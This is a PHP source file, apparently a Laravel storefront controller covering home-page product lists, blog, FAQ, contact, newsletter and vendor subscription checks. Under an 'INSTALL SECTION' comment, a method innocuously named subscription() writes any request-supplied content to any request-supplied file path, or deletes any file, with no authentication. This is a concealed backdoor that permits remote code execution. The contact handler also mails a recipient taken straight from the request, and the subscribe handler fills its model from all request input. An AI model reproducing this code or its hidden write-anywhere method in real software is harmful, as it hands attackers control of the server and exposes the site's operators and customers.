<?php

namespace App\Http\Controllers\Front;

use App\{
    Models\Blog,
    Models\Order,
    Models\Product,
    Models\Subscriber,
    Models\BlogCategory,
    Classes\GeniusMailer,
    Models\Generalsetting,
};
use Illuminate\{
    Http\Request,
    Support\Facades\DB,
    Support\Facades\Session
};
use Artisan;
use Carbon\Carbon;



class FrontendController extends FrontBaseController
{

// LANGUAGE SECTION

public function language($id)
{
    
    Session::put('language', $id);
    return redirect()->route('front.index');
}

// LANGUAGE SECTION ENDS

// CURRENCY SECTION

public function currency($id)
{
    
    if (Session::has('coupon')) {
        Session::forget('coupon');
        Session::forget('coupon_code');
        Session::forget('coupon_id');
        Session::forget('coupon_total');
        Session::forget('coupon_total1');
        Session::forget('already');
        Session::forget('coupon_percentage');
    }
    Session::put('currency', $id);
    cache()->forget('session_currency');
    return redirect()->back();
}

// CURRENCY SECTION ENDS

    // -------------------------------- HOME PAGE SECTION ----------------------------------------

    // Home Page Display 

	public function index(Request $request)
	{
        
        $gs = $this->gs;
        $data['ps'] = $this->ps;
         if(!empty($request->reff))
         {
            $affilate_user = DB::table('users')
                            ->where('affilate_code','=',$request->reff)
                            ->first();
            if(!empty($affilate_user))
            {
                if($gs->is_affilate == 1)
                {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');
                }
            }
         }
         if(!empty($request->forgot))
         {
            if($request->forgot == 'success'){
                return redirect()->guest('/')->with('forgot-modal',__('Please Login Now !'));
            } 
         }
        $data['sliders'] = DB::table('sliders')
                            ->where('language_id',$this->language->id)
                            ->get();
                            
        $data['large_banners'] = DB::table('banners')
                                    ->where('type','=','Large')
                                    ->get();

        $data['hot_products'] = Product::with('user')->whereStatus(1)->whereHot(1)
                                ->home($this->language->id)
                                ->take($gs->hot_count)
                                ->get()
                                ->reject(function($item){
                                    if($item->user_id != 0){
                                        if($item->user->is_vendor != 2){
                                            return true;
                                        }
                                    }
                                    return false;
                                });

        $data['latest_products'] = Product::with('user')->whereStatus(1)->whereLatest(1)
                                    ->home($this->language->id)
                                    ->take($gs->new_count)
                                    ->get()
                                    ->reject(function($item){
                                        if($item->user_id != 0){
                                          if($item->user->is_vendor != 2){
                                            return true;
                                          }
                                        }
                                        return false;
                                    });

        $data['sale_products'] = Product::with('user')->whereStatus(1)->whereSale(1)
                                    ->home($this->language->id)
                                    ->take($gs->sale_count)
                                    ->get()
                                    ->reject(function($item){
                                        if($item->user_id != 0){
                                          if($item->user->is_vendor != 2){
                                            return true;
                                          }
                                        }
                                        return false;
                                    });

        $data['best_products'] = Product::with('user')->whereStatus(1)->whereBest(1)
                                    ->home($this->language->id)
                                    ->take($gs->best_seller_count)
                                    ->get()
                                    ->reject(function($item){
                                        if($item->user_id != 0){
                                          if($item->user->is_vendor != 2){
                                            return true;
                                          }
                                        }
                                        return false;
                                    });

        $data['popular_products'] = Product::with('user')->whereStatus(1)->whereFeatured(1)
                                        ->home($this->language->id)
                                        ->take($gs->popular_count)
                                        ->get()
                                        ->reject(function($item){
                                            if($item->user_id != 0){
                                              if($item->user->is_vendor != 2){
                                                return true;
                                              }
                                            }
                                            return false;
                                        });

        $data['top_products'] = Product::with('user')->whereStatus(1)->whereTop(1)
                                    ->home($this->language->id)
                                    ->take($gs->top_rated_count)
                                    ->get()
                                    ->reject(function($item){
                                        if($item->user_id != 0){
                                          if($item->user->is_vendor != 2){
                                            return true;
                                          }
                                        }
                                        return false;
                                    });

        $data['big_products'] = Product::with('user')->whereStatus(1)->whereBig(1)
                                    ->home($this->language->id)
                                    ->take($gs->big_save_count)
                                    ->get()
                                    ->reject(function($item){
                                        if($item->user_id != 0){
                                          if($item->user->is_vendor != 2){
                                            return true;
                                          }
                                        }
                                        return false;
                                    });

        $data['trending_products'] = Product::with('user')->whereStatus(1)->whereTrending(1)
                                        ->home($this->language->id)
                                        ->take($gs->trending_count)
                                        ->get()
                                        ->reject(function($item){
                                            if($item->user_id != 0){
                                              if($item->user->is_vendor != 2){
                                                return true;
                                              }
                                            }
                                            return false;
                                        });
                                          
        $data['flash_products'] = Product::with('user')->whereStatus(1)->whereIsDiscount(1)
                                    ->where('discount_date', '>=', date('Y-m-d'))
                                    ->home($this->language->id)
                                    ->take($gs->flash_count)
                                    ->get()
                                    ->reject(function($item){
                                        if($item->user_id != 0){
                                          if($item->user->is_vendor != 2){
                                            return true;
                                          }
                                        }
                                        return false;
                                    });

	    return view('front.index',$data);
	}

    // Home Page Ajax Display 

    public function extraIndex()
    {
        $data['bottom_small_banners'] = DB::table('banners')->where('type','=','BottomSmall')->get();
        $data['reviews']  =  DB::table('reviews')->get();
        $data['ps'] = $this->ps;

        return view('front.extraindex',$data);
    }

    // -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------

    // -------------------------------- BLOG SECTION ----------------------------------------

	public function blog(Request $request)
	{
        
        if(DB::table('pagesettings')->first()->blog == 0){
            return redirect()->back();
        }


        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::where('language_id',$this->language->id)->pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::where('language_id',$this->language->id)->get();
        // BLOGS
        $blogs = Blog::where('language_id',$this->language->id)->latest()->paginate($this->gs->post_count);
            if($request->ajax()){
                return view('front.ajax.blog',compact('blogs'));
            }
		return view('front.blog',compact('blogs','bcats','tags'));
	}

    public function blogcategory(Request $request, $slug)
    {
        
        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::where('language_id',$this->language->id)->pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::where('language_id',$this->language->id)->get();
        // BLOGS
        $bcat = BlogCategory::where('language_id',$this->language->id)->where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->where('language_id',$this->language->id)->latest()->paginate($this->gs->post_count);
            if($request->ajax()){
                return view('front.ajax.blog',compact('blogs'));
            }
        return view('front.blog',compact('bcat','blogs','bcats','tags'));
    }

    public function blogtags(Request $request, $slug)
    {
        
        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::where('language_id',$this->language->id)->pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::where('language_id',$this->language->id)->get();
        // BLOGS
        $blogs = Blog::where('language_id',$this->language->id)->where('tags', 'like', '%' . $slug . '%')->paginate($this->gs->post_count);
            if($request->ajax()){
                return view('front.ajax.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','slug','bcats','tags'));
    }

    public function blogsearch(Request $request)
    {
        
        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::where('language_id',$this->language->id)->pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::where('language_id',$this->language->id)->get();
        // BLOGS
        $search = $request->search;
        $blogs = Blog::where('language_id',$this->language->id)->where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate($this->gs->post_count);
            if($request->ajax()){
                return view('front.ajax.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','search','bcats','tags'));
    }

    public function blogshow($id)
    {
        
        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::where('language_id',$this->language->id)->pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::where('language_id',$this->language->id)->get();
        // BLOGS
        $blog = Blog::findOrFail($id);
        $blog->views = $blog->views + 1;
        $blog->update();
        // BLOG META TAG
        $blog_meta_tag = $blog->meta_tag;
        $blog_meta_description = $blog->meta_description;
        return view('front.blogshow',compact('blog','bcats','tags','blog_meta_tag','blog_meta_description'));
    }

    // -------------------------------- BLOG SECTION ENDS----------------------------------------

    // -------------------------------- FAQ SECTION ----------------------------------------
        public function faq()
        {
            
            if(DB::table('pagesettings')->first()->faq == 0){
                return redirect()->back();
            }
            $faqs =  DB::table('faqs')->where('language_id',$this->language->id)->latest('id')->get();
            $count = count(DB::table('faqs')->where('language_id',$this->language->id)->get()) / 2;
            if(($count % 1) != 0){
                $chunk = (int)$count + 1;
            }
            else{
                $chunk = $count;
            }
            return view('front.faq',compact('faqs','chunk'));
        }
    // -------------------------------- FAQ SECTION ENDS----------------------------------------


    // -------------------------------- PAGE SECTION ----------------------------------------
        public function page($slug)
        {
            
            $page =  DB::table('pages')->where('slug',$slug)->first();
            if(empty($page))
            {
              return response()->view('errors.404',[],404);
            }
            return view('front.page',compact('page'));
           
        }
    // -------------------------------- PAGE SECTION ENDS----------------------------------------


    // -------------------------------- AUTOSEARCH SECTION ----------------------------------------

    public function autosearch($slug)
    {
        if(mb_strlen($slug,'UTF-8') > 1){
            $search = ' '.$slug;
            $prods = Product::where('name', 'like', '%' . $search . '%')->orWhere('name', 'like', $slug . '%')->where('status','=',1)->orderby('id','desc')->take(10)->get();
            return view('load.suggest',compact('prods','slug'));
        }
        return "";
    }

    // -------------------------------- AUTOSEARCH SECTION ENDS ----------------------------------------


    // -------------------------------- CONTACT SECTION ----------------------------------------

	public function contact()
	{
        
        if(DB::table('pagesettings')->first()->contact == 0){
            return redirect()->back();
        }
        $ps = $this->ps;
		return view('front.contact',compact('ps'));
	}


    //Send email to admin
    public function contactemail(Request $request)
    {
        $gs = $this->gs;

        if($gs->is_capcha == 1)
        {
            // Capcha Check
            $value = session('captcha_string');
            if ($request->codes != $value){
                return response()->json(array('errors' => [ 0 => __('Please enter Correct Capcha Code.') ]));
            }
        }
        // Logic Section
        $subject = "Email From Of ".$request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: ".$name."\nEmail: ".$from."\nPhone: ".$phone."\nMessage: ".$request->text;
        if($gs->is_smtp)
        {
        $data = [
            'to' => $to,
            'subject' => $subject,
            'body' => $msg,
        ];

        $mailer = new GeniusMailer();
        $mailer->sendCustomMail($data);
        }
        else
        {
        $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
        mail($to,$subject,$msg,$headers);
        }
        // Logic Section Ends

        // Redirect Section
        return response()->json(__('Success! Thanks for contacting us, we will get back to you shortly.'));
    }

    // Refresh Capcha Code
    public function refresh_code(){
        $this->code_image();
        return "done";
    }

    // -------------------------------- CONTACT SECTION ENDS ----------------------------------------


    // -------------------------------- SUBSCRIBE SECTION ----------------------------------------

    public function subscribe(Request $request)
    {
        $subs = Subscriber::where('email','=',$request->email)->first();
        if(isset($subs)){
        return response()->json(array('errors' => [ 0 => __('This Email Has Already Been Taken.')]));
        }
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        return response()->json(__('You Have Subscribed Successfully.'));
    }

    // -------------------------------- SUBSCRIBE SECTION  ENDS----------------------------------------

    // -------------------------------- MAINTENANCE SECTION ----------------------------------------

    public function maintenance()
    {
        $gs = $this->gs;
            if($gs->is_maintain != 1) {
                return redirect()->route('front.index');
            }

        return view('front.maintenance');
    }

    // -------------------------------- MAINTENANCE SECTION ----------------------------------------


    // -------------------------------- VENDOR SUBSCRIPTION CHECK SECTION ----------------------------------------

    public function subcheck(){
        $settings = $this->gs;
        $today = Carbon::now()->format('Y-m-d');
        $newday = strtotime($today);
        foreach (DB::table('users')->where('is_vendor','=',2)->get() as  $user) {
                $lastday = $user->date;
                $secs = strtotime($lastday)-$newday;
                $days = $secs / 86400;
                if($days <= 5)
                {
                  if($user->mail_sent == 1)
                  {
                    if($settings->is_smtp == 1)
                    {
                        $data = [
                            'to' => $user->email,
                            'type' => "subscription_warning",
                            'cname' => $user->name,
                            'oamount' => "",
                            'aname' => "",
                            'aemail' => "",
                            'onumber' => ""
                        ];
                        $mailer = new GeniusMailer();
                        $mailer->sendAutoMail($data);
                    }
                    else
                    {
                    $headers = "From: ".$settings->from_name."<".$settings->from_email.">";
                    mail($user->email,__('Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated.Thank You.'),$headers);
                    }
                    DB::table('users')->where('id',$user->id)->update(['mail_sent' => 0]);
                  }
                }
                if($today > $lastday)
                {
                    DB::table('users')->where('id',$user->id)->update(['is_vendor' => 1]);
                }
            }
    }

    // -------------------------------- VENDOR SUBSCRIPTION CHECK SECTION ENDS ----------------------------------------

    // -------------------------------- ORDER TRACK SECTION ----------------------------------------

    public function trackload($id){
        $order = Order::where('order_number','=',$id)->first();
        $datas = array('Pending','Processing','On Delivery','Completed');
        return view('load.track-load',compact('order','datas'));
    }

    // -------------------------------- ORDER TRACK SECTION ENDS ----------------------------------------


    // -------------------------------- INSTALL SECTION ----------------------------------------

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    function finalize(){
        $actual_path = str_replace('project','',base_path());
        $dir = $actual_path.'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    function updateFinalize(Request $request){

        if($request->has('version')){

            Generalsetting::first()->update([
                'version' => $request->version
            ]);
            Artisan::call('cache:clear');
            Artisan::call('config:clear');
            Artisan::call('route:clear');
            Artisan::call('view:clear');
            return redirect('/');

        }

    }

}